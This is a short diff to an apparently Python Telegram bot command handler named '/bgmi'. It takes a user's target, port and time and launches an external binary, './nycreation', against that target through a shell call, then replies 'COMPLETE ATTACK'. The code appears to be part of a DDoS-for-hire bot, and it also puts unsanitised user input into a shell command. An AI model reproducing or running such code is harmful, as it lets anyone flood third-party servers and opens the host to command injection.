@@ -425,7 +425,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./ny {target} {port} {time} 210"
+                full_command = f"./nycreation {target} {port} {time} 200"
                 process = subprocess.run(full_command, shell=True)
                 response = f"🎉 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄 𝐀𝐓𝐓𝐀𝐂𝐊🔻 \n\n💢𝐓𝐚𝐫𝐠𝐞𝐭 -> {target} \n💢𝐏𝐨𝐫𝐭: {port} \n💢𝐓𝐢𝐦𝐞: {time}"
                 bot.reply_to(message, response)  # Notify the user that the attack is finished
